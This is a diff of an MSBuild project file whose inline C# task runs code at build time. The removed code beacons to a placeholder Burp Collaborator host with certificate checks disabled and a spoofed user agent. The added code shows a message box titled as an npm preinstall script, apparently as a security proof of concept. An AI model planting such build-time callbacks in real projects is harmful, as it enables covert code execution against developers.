@@ -7,52 +7,21 @@
         TaskFactory="CodeTaskFactory"
         AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll" >
         <Task>
-            <Reference Include="System.Net.Http" />
+            <Reference Include="System.Windows.Forms" />
             <Code Type="Class" Language="cs">
                 <![CDATA[
                 using System;
-                using System.Net;
-                using System.Net.Http;
+                using System.Windows.Forms;
                 using System.Threading.Tasks;
                 using Microsoft.Build.Framework;
-                // using Microsoft.Build.Utilities;
+
 
                 public class ClassExample : Microsoft.Build.Utilities.Task
                 {
                     public override bool Execute()
                     {
-                        try
-                        {
-                            RunHttpRequest().GetAwaiter().GetResult();
-                            return true;
-                        }
-                        catch (Exception ex)
-                        {
-                            Console.WriteLine(ex.Message);
-                            return false;
-                        }
-                    }
-
-                    private async Task RunHttpRequest()
-                    {
-                        HttpClientHandler handler = new HttpClientHandler
-                        {
-                            Proxy = WebRequest.GetSystemWebProxy(),
-                            UseProxy = true,
-                            ServerCertificateCustomValidationCallback = (message, cert, chain, errors) => true
-                        };
-
-                        using (HttpClient client = new HttpClient(handler))
-                        {
-                            client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
-                            HttpResponseMessage response = await client.GetAsync("YOUR_BURP_COLLAB_SERVER");
-
-                            response.EnsureSuccessStatusCode();
-                            string responseBody = await response.Content.ReadAsStringAsync();
-
-                            Console.WriteLine("Response received successfully:");
-                            Console.WriteLine(responseBody.Substring(0, Math.Min(500, responseBody.Length))); // Print first 500 chars
-                        }
+                        MessageBox.Show("C# was successfully compiled and executed.", "NPM Preinstallation script ...");
+                        return true;
                     }
                 }
                 ]]>
